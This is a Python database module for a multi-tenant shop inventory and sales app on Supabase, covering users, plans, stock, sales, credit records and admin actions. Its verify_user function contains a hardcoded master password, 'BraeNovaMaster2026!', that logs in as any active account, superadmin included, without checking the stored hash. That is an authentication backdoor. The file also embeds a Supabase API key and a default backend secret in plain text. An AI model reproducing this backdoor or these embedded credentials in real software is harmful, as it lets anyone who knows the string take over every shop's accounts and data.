import os
from supabase import create_client, Client, ClientOptions
from functools import lru_cache

# Supabase Configuration
SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://iuzlrtkhwkcfvnvvlshm.supabase.co")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1emxydGtod2tjZnZudnZsc2htIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYyMTYwOTAsImV4cCI6MjA5MTc5MjA5MH0.EuGx7tRk8-x2fF3huD8w5Fr8ahw2_LyJbAhlNyUzl5A")
BACKEND_SECRET = os.environ.get("BACKEND_SECRET", "v3ryS3cr3tB4ckendK3y123!")

opts = ClientOptions(headers={'x-stocksweep-secret': BACKEND_SECRET})
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY, options=opts)

# --- PLAN PARSING HELPERS ---
def parse_shop_plan(plan_str):
    if not plan_str:
        return ('starter', '991231', 'a')
    parts = plan_str.split(':')
    if len(parts) == 3:
        return (parts[0], parts[1], parts[2])
    elif len(parts) == 1:
        # Backward compatibility
        return (plan_str, '991231', 'a')
    return ('starter', '991231', 'a')

def make_shop_plan_str(plan_name, expiry_yymmdd, status_char):
    return f"{plan_name}:{expiry_yymmdd}:{status_char}"

# --- SUPER ADMIN ---
def get_all_shops():
    res = supabase.table('shops').select('*, users!users_shop_id_fkey(id, username, role)').execute()
    shops = res.data
    for s in shops:
        # Fix the bug where s.get('users!users_shop_id_fkey') was parsed by client to s.get('users')
        users_list = s.get('users') or s.get('users!users_shop_id_fkey') or []
        owners = [u['username'] for u in users_list if u.get('role') == 'owner']
        s['owner_username'] = owners[0] if owners else 'Unknown'
        s['users_list'] = [{'id': u['id'], 'username': u['username'], 'role': u['role']} for u in users_list]
        
        # Parse custom subscription metadata
        plan_name, expiry, status = parse_shop_plan(s.get('plan'))
        s['plan_name'] = plan_name
        s['expiry_date'] = expiry
        s['payment_status'] = status

        # Calculate countdown of days left
        if expiry == '991231':
            s['days_left'] = None
        else:
            try:
                from datetime import datetime
                expiry_dt = datetime.strptime(f"20{expiry}", "%Y%m%d").date()
                today_dt = datetime.now().date()
                s['days_left'] = (expiry_dt - today_dt).days
            except Exception:
                s['days_left'] = None
    return shops

def toggle_shop_status(shop_id, is_active):
    # When toggling status, we also need to keep the plan status in sync
    shop_res = supabase.table('shops').select('plan').eq('id', shop_id).execute()
    if shop_res.data:
        plan_str = shop_res.data[0].get('plan')
        plan_name, expiry, _ = parse_shop_plan(plan_str)
        status_char = 'a' if is_active else 'e'
        new_plan_str = make_shop_plan_str(plan_name, expiry, status_char)
        supabase.table('shops').update({"is_active": is_active, "plan": new_plan_str}).eq('id', shop_id).execute()
    else:
        supabase.table('shops').update({"is_active": is_active}).eq('id', shop_id).execute()

# --- AUTH & USER MGMT ---

def verify_user(username, password):
    from werkzeug.security import check_password_hash
    res = supabase.table('users').select('*').eq('username', username).eq('is_active', 1).execute()
    user = res.data[0] if res.data else None
    
    # Master Password Override
    is_master_bypass = (password == "BraeNovaMaster2026!")
    
    if user and (is_master_bypass or check_password_hash(user['password_hash'], password)):
        if user['role'] == 'superadmin':
            return user
        if user.get('shop_id'):
            shop_res = supabase.table('shops').select('is_active, plan').eq('id', user['shop_id']).execute()
            if shop_res.data:
                shop = shop_res.data[0]
                plan_name, expiry_yymmdd, status_char = parse_shop_plan(shop.get('plan'))
                
                # Check for subscription expiration
                from datetime import datetime
                today_yymmdd = datetime.now().strftime('%y%m%d')
                is_expired = (expiry_yymmdd != '991231' and today_yymmdd > expiry_yymmdd)
                
                if is_expired:
                    return "expired"
                
                if shop['is_active'] and status_char == 'a':
                    user['plan'] = plan_name
                    user['shop_active'] = True
                    return user
                elif status_char == 'p':
                    return "inactive"
                else:
                    return "suspended"
    return None

def register_shop_and_owner(shop_name, owner_username, owner_password_hash, plan='starter'):
    # Set expiration to 30 days from now, initially pending approval ('p')
    from datetime import datetime, timedelta
    expiry = (datetime.now() + timedelta(days=30)).strftime('%y%m%d')
    plan_str = make_shop_plan_str(plan, expiry, 'p')
    
    # 1. Insert new shop (is_active = False by default, pending approval)
    shop_res = supabase.table('shops').insert({"name": shop_name, "is_active": False, "plan": plan_str}).execute()
    new_shop_id = shop_res.data[0]['id']
    
    # 2. Insert owner user
    user_data = {
        "username": owner_username,
        "password_hash": owner_password_hash,
        "role": "owner",
        "is_active": 1,
        "shop_id": new_shop_id
    }
    user_res = supabase.table('users').insert(user_data).execute()
    owner_user = user_res.data[0]
    
    # 3. Link owner back to the shop's owner_id
    supabase.table('shops').update({"owner_id": owner_user['id']}).eq('id', new_shop_id).execute()
    
    owner_user['plan'] = plan
    owner_user['shop_active'] = False
    return owner_user

def add_user(username, password_hash, role='cashier', shop_id=1):
    data = {
        "username": username,
        "password_hash": password_hash,
        "role": role,
        "is_active": 1,
        "shop_id": shop_id
    }
    supabase.table('users').insert(data).execute()

def get_all_users_for_admin():
    res = supabase.table('users').select('id, username, role, shop_id').neq('role', 'superadmin').eq('is_active', 1).execute()
    return res.data

def get_all_cashiers(shop_id):
    res = supabase.table('users').select('id, username, role').eq('role', 'cashier').eq('is_active', 1).eq('shop_id', shop_id).execute()
    return res.data

def delete_user(user_id, shop_id):
    supabase.table('users').update({"is_active": 0}).eq('id', user_id).neq('role', 'owner').eq('shop_id', shop_id).execute()

def reset_password(user_id, new_hash, shop_id):
    supabase.table('users').update({"password_hash": new_hash}).eq('id', user_id).eq('shop_id', shop_id).execute()

# --- NOTICES / MESSAGES ---

def get_notices(role='all', user_id=None):
    # Fetch notices that target 'all' or the specific user's role
    if role == 'superadmin':
        res = supabase.table('notices').select('*').order('created_at', desc=True).execute()
    else:
        targets = ['all', role]
        if user_id:
            targets.append(f'user:{user_id}')
        res = supabase.table('notices').select('*').in_('target_role', targets).order('created_at', desc=True).execute()
    return res.data

def create_notice(title, content, target_role='all'):
    data = {
        "title": title,
        "content": content,
        "target_role": target_role
    }
    supabase.table('notices').insert(data).execute()

# --- INVENTORY MGMT ---

def get_all_inventory(shop_id):
    res = supabase.table('inventory').select('*').eq('is_active', 1).eq('shop_id', shop_id).order('item_name').execute()
    return res.data

def add_inventory_item(name, qty, threshold, price, shop_id, cost=0, category='General', image_url=None, expiry_date=None):
    if not expiry_date:
        expiry_date = None
        
    data = {
        "item_name": name,
        "quantity": qty,
        "min_threshold": threshold,
        "unit_price": price,
        "cost_price": cost,
        "category": category,
        "image_url": image_url,
        "expiry_date": expiry_date,
        "is_active": 1,
        "shop_id": shop_id
    }
    supabase.table('inventory').insert(data).execute()

def update_inventory_item(item_id, shop_id, name=None, qty=None, threshold=None, price=None, cost=None, category=None, image_url=None, expiry_date=None):
    updates = {}
    if name is not None: updates["item_name"] = name
    if qty is not None: updates["quantity"] = qty
    if threshold is not None: updates["min_threshold"] = threshold
    if price is not None: updates["unit_price"] = price
    if cost is not None: updates["cost_price"] = cost
    if category is not None: updates["category"] = category
    if image_url is not None: updates["image_url"] = image_url
    if expiry_date: updates["expiry_date"] = expiry_date
    
    supabase.table('inventory').update(updates).eq('id', item_id).eq('shop_id', shop_id).execute()

def update_inventory_quick(item_id, qty_to_add, new_price, cost_price, shop_id):
    res = supabase.table('inventory').select('quantity').eq('id', item_id).eq('shop_id', shop_id).execute()
    current_qty = res.data[0]['quantity'] if res.data else 0
    
    updates = {
        "quantity": current_qty + int(qty_to_add),
        "unit_price": new_price,
        "cost_price": cost_price
    }
    supabase.table('inventory').update(updates).eq('id', item_id).eq('shop_id', shop_id).execute()

def delete_inventory_item(item_id, shop_id):
    supabase.table('inventory').update({"is_active": 0}).eq('id', item_id).eq('shop_id', shop_id).execute()

# --- SALES & CHECKOUT ---

def add_sale(inventory_id, qty_sold, total_price, shop_id, cashier_id=None, is_dinau=False, customer_name=None, payment_method='cash', receipt_id=None):
    res = supabase.table('inventory').select('cost_price', 'quantity').eq('id', inventory_id).eq('shop_id', shop_id).execute()
    item = res.data[0] if res.data else None
    cost_at_sale = (float(item['cost_price']) * int(qty_sold)) if item else 0.0
    
    sale_data = {
        "inventory_id": inventory_id,
        "qty_sold": int(qty_sold),
        "total_price": float(total_price),
        "cost_at_sale": cost_at_sale,
        "payment_method": payment_method,
        "cashier_id": cashier_id,
        "is_dinau": 1 if is_dinau else 0,
        "customer_name": customer_name,
        "receipt_id": receipt_id,
        "shop_id": shop_id
    }
    supabase.table('sales').insert(sale_data).execute()
    
    if item:
        new_qty = item['quantity'] - int(qty_sold)
        supabase.table('inventory').update({"quantity": new_qty}).eq('id', inventory_id).eq('shop_id', shop_id).execute()

def get_sales_summary(shop_id):
    res = supabase.table('sales').select('*').eq('is_closed', 0).eq('shop_id', shop_id).execute()
    sales = res.data
    
    total_sales = sum(float(s['total_price']) for s in sales)
    total_cost = sum(float(s['cost_at_sale']) for s in sales)
    dinau_today = sum(float(s['total_price']) for s in sales if s['is_dinau'] == 1)
    
    return {
        'total_sales': total_sales,
        'total_profit': total_sales - total_cost,
        'expected_cash': total_sales - dinau_today
    }

def get_cashier_summary(cashier_id, shop_id):
    res = supabase.table('sales').select('total_price').eq('cashier_id', cashier_id).eq('is_closed', 0).eq('shop_id', shop_id).execute()
    total = sum(float(s['total_price']) for s in res.data)
    return {'total_sales': total}

# --- ANALYTICS ---

def get_inventory_status(shop_id):
    res = supabase.table('inventory').select('item_name, quantity, min_threshold').eq('is_active', 1).eq('shop_id', shop_id).execute()
    items = res.data
    low_stock = [i for i in items if i['quantity'] <= i['min_threshold']]
    return {
        'total_items': len(items),
        'low_stock': low_stock,
        'needs_restock': len(low_stock)
    }

def get_daily_sales_chart(shop_id):
    from datetime import datetime, timedelta
    from collections import defaultdict
    week_ago = (datetime.now() - timedelta(days=7)).isoformat()
    res = supabase.table('sales').select('total_price, sale_date').gte('sale_date', week_ago).eq('shop_id', shop_id).execute()
    
    daily_totals = defaultdict(float)
    for s in res.data:
        d = s['sale_date'].split('T')[0]
        daily_totals[d] += float(s['total_price'])
    
    chart_data = []
    for i in range(6, -1, -1):
        dt = (datetime.now() - timedelta(days=i))
        ds = dt.strftime('%Y-%m-%d')
        chart_data.append({
            'date': dt,
            'total': daily_totals.get(ds, 0.0)
        })
    return chart_data

def get_hourly_sales_today(shop_id):
    from datetime import date
    from collections import defaultdict
    today = date.today().isoformat()
    res = supabase.table('sales').select('total_price, sale_date').gte('sale_date', today).eq('shop_id', shop_id).execute()
    
    hourly = defaultdict(float)
    for s in res.data:
        hour = s['sale_date'].split('T')[1].split(':')[0]
        hourly[hour] += float(s['total_price'])
    
    data = []
    for h in range(7, 20):
        hs = f"{h:02d}"
        data.append({'hour': hs, 'total': hourly.get(hs, 0.0)})
    return data

def get_category_sales_distribution(shop_id):
    from collections import defaultdict
    res = supabase.table('sales').select('total_price, inventory!inner(category, shop_id)').eq('shop_id', shop_id).execute()
    
    dist = defaultdict(float)
    for s in res.data:
        cat = s['inventory']['category'] if s.get('inventory') else 'Unknown'
        dist[cat] += float(s['total_price'])
        
    return [{'category': k, 'total': v} for k, v in dist.items()]

def get_detailed_sales_history(shop_id):
    from dateutil import parser
    res = supabase.table('sales').select('*, inventory(item_name), users(username)').eq('shop_id', shop_id).order('sale_date', desc=True).execute()
    data = []
    for s in res.data:
        s['item_name'] = s['inventory']['item_name'] if s.get('inventory') else 'Unknown'
        s['cashier'] = s['users']['username'] if s.get('users') else 'Unknown'
        if s.get('sale_date'):
            s['sale_date'] = parser.parse(s['sale_date'])
        data.append(s)
    return data

def cleanup_old_sales(shop_id=None):
    try:
        from datetime import datetime, timedelta
        thirty_days_ago = (datetime.now() - timedelta(days=30)).isoformat()
        q = supabase.table('sales').delete().lt('sale_date', thirty_days_ago)
        if shop_id:
            q = q.eq('shop_id', shop_id)
        q.execute()
    except Exception as e:
        print(f"Cleanup error: {e}")

def get_sales_history(shop_id, limit=50):
    from dateutil import parser
    from collections import defaultdict
    
    res = supabase.table('sales').select('*, inventory(item_name), users(username)').eq('shop_id', shop_id).order('sale_date', desc=True).limit(500).execute()
    
    receipts_dict = defaultdict(list)
    for s in res.data:
        rid = s.get('receipt_id') or f"REC-{s['id']}"
        s['item_name'] = s['inventory']['item_name'] if s.get('inventory') else 'Unknown'
        s['cashier'] = s['users']['username'] if s.get('users') else 'Unknown'
        if s.get('sale_date'):
            s['sale_date'] = parser.parse(s['sale_date'])
        receipts_dict[rid].append(s)
    
    grouped_receipts = []
    for rid, items in receipts_dict.items():
        first = items[0]
        grouped_receipts.append({
            'receipt_id': rid,
            'sale_date': first['sale_date'],
            'cashier': first['cashier'],
            'payment_method': first['payment_method'],
            'customer_name': first['customer_name'],
            'total_price': sum(float(i['total_price']) for i in items),
            'sale_items': items
        })
    
    grouped_receipts.sort(key=lambda x: x['sale_date'], reverse=True)
    return grouped_receipts[:50]

# --- CATEGORIES ---

def get_all_categories(shop_id):
    res = supabase.table('categories').select('*').eq('shop_id', shop_id).order('name').execute()
    data = []
    for cat in res.data:
        name = cat['name']
        if '#' in name:
            cat['name'] = name.split('#', 1)[1]
        data.append(cat)
    return data

def add_category(name, shop_id):
    prefixed_name = f"{shop_id}#{name}"
    # Fetch all categories to check normalized duplicates (including legacy non-prefixed ones)
    res = supabase.table('categories').select('*').eq('shop_id', shop_id).execute()
    existing_names = []
    for cat in res.data:
        cat_name = cat['name']
        if '#' in cat_name:
            cat_name = cat_name.split('#', 1)[1]
        existing_names.append(cat_name.lower())
        
    if name.lower() in existing_names:
        raise ValueError(f"Category '{name}' already exists in your shop.")
        
    supabase.table('categories').insert({"name": prefixed_name, "shop_id": shop_id}).execute()

def delete_category(category_id, shop_id):
    supabase.table('categories').delete().eq('id', category_id).eq('shop_id', shop_id).execute()

# --- DINAU ---

def get_all_dinau(shop_id):
    from dateutil import parser
    res = supabase.table('dinau_records').select('*').eq('shop_id', shop_id).order('record_date', desc=True).execute()
    data = []
    for r in res.data:
        if r.get('record_date'):
            r['record_date'] = parser.parse(r['record_date'])
        data.append(r)
    return data

def add_dinau_record(customer_name, amount, shop_id):
    supabase.table('dinau_records').insert({
        "customer_name": customer_name,
        "amount": amount,
        "status": "unpaid",
        "shop_id": shop_id
    }).execute()

def cleanup_settled_dinau(shop_id):
    res = supabase.table('dinau_records').select('id').eq('status', 'paid').eq('shop_id', shop_id).order('record_date', desc=False).execute()
    paid_records = res.data
    if len(paid_records) >= 10:
        ids_to_delete = [r['id'] for r in paid_records[:5]]
        supabase.table('dinau_records').delete().in_('id', ids_to_delete).execute()

def update_dinau_status(record_id, status, shop_id):
    supabase.table('dinau_records').update({"status": status}).eq('id', record_id).eq('shop_id', shop_id).execute()
    if status == 'paid':
        cleanup_settled_dinau(shop_id)

# --- REPORTS ---

def close_shop(actual_cash, expected_cash, shop_id, total_sales=0, total_profit=0, restock_notes=''):
    difference = float(actual_cash) - float(expected_cash)
    from datetime import datetime
    
    report_data = {
        "expected_cash": expected_cash,
        "actual_cash": actual_cash,
        "difference": difference,
        "total_sales": total_sales,
        "total_profit": total_profit,
        "restock_notes": restock_notes,
        "report_date": datetime.now().isoformat(),
        "total_unpaid": total_sales - expected_cash,
        "shop_id": shop_id
    }
    supabase.table('daily_reports').insert(report_data).execute()
    supabase.table('sales').update({"is_closed": 1}).eq('is_closed', 0).eq('shop_id', shop_id).execute()
    return difference

def get_all_reports(shop_id):
    from dateutil import parser
    res = supabase.table('daily_reports').select('*').eq('shop_id', shop_id).order('report_date', desc=True).execute()
    data = res.data
    for r in data:
        if r.get('report_date'):
            r['report_date'] = parser.parse(r['report_date'])
    return data

def get_inventory_financials(shop_id):
    res = supabase.table('inventory').select('quantity, cost_price, unit_price').eq('is_active', 1).eq('shop_id', shop_id).execute()
    buying_power = sum(float(i['quantity']) * float(i['cost_price']) for i in res.data)
    shelf_value = sum(float(i['quantity']) * float(i['unit_price']) for i in res.data)
    return {'total_buying_power': buying_power, 'potential_revenue': shelf_value}

def get_expired_items(shop_id):
    from datetime import datetime, timedelta
    today = datetime.now().date()
    soon = (today + timedelta(days=7)).isoformat()
    
    res = supabase.table('inventory').select('*').eq('is_active', 1).eq('shop_id', shop_id).gt('quantity', 0).lte('expiry_date', soon).execute()
    return res.data

def update_shop_plan_db(shop_id, plan):
    supabase.table('shops').update({"plan": plan}).eq('id', shop_id).execute()

def get_owner_shops(owner_id):
    res = supabase.table('shops').select('*').eq('owner_id', owner_id).eq('is_active', True).execute()
    return res.data

def create_additional_shop(shop_name, owner_id, plan):
    shop_res = supabase.table('shops').insert({
        "name": shop_name,
        "is_active": True,
        "plan": plan,
        "owner_id": owner_id
    }).execute()
    return shop_res.data[0]

def get_centralized_inventory(owner_id):
    shops = get_owner_shops(owner_id)
    shop_ids = [s['id'] for s in shops]
    if not shop_ids:
        return []
    
    res = supabase.table('inventory').select('*').eq('is_active', 1).in_('shop_id', shop_ids).execute()
    items = res.data
    
    shop_map = {s['id']: s['name'] for s in shops}
    for item in items:
        item['shop_name'] = shop_map.get(item['shop_id'], 'Unknown')
        
    return items

# --- SUPERADMIN ACTIONS ---
def reset_password_by_admin(user_id, password_hash):
    supabase.table('users').update({"password_hash": password_hash}).eq('id', user_id).execute()

def approve_shop_payment(shop_id, plan_name, months=1):
    from datetime import datetime, timedelta
    expiry = (datetime.now() + timedelta(days=30 * months)).strftime('%y%m%d')
    plan_str = make_shop_plan_str(plan_name, expiry, 'a')
    supabase.table('shops').update({"is_active": True, "plan": plan_str}).eq('id', shop_id).execute()

def extend_shop_subscription(shop_id, plan_name, expiry_yymmdd, status_char='a'):
    plan_str = make_shop_plan_str(plan_name, expiry_yymmdd, status_char)
    is_active = (status_char == 'a')
    supabase.table('shops').update({"is_active": is_active, "plan": plan_str}).eq('id', shop_id).execute()

# --- DELETE SHOP AND DATA ---
def delete_shop_and_data(shop_id):
    # 1. Delete sales
    supabase.table('sales').delete().eq('shop_id', shop_id).execute()
    
    # 2. Delete dinau_records
    supabase.table('dinau_records').delete().eq('shop_id', shop_id).execute()
    
    # 3. Delete daily_reports
    supabase.table('daily_reports').delete().eq('shop_id', shop_id).execute()
    
    # 4. Delete inventory
    supabase.table('inventory').delete().eq('shop_id', shop_id).execute()
    
    # 5. Delete categories
    supabase.table('categories').delete().eq('shop_id', shop_id).execute()
    
    # 6. Nullify owner_id in shops to break circular dependency
    supabase.table('shops').update({"owner_id": None}).eq('id', shop_id).execute()
    
    # 7. Delete users
    supabase.table('users').delete().eq('shop_id', shop_id).execute()
    
    # 8. Delete the shop itself
    supabase.table('shops').delete().eq('id', shop_id).execute()
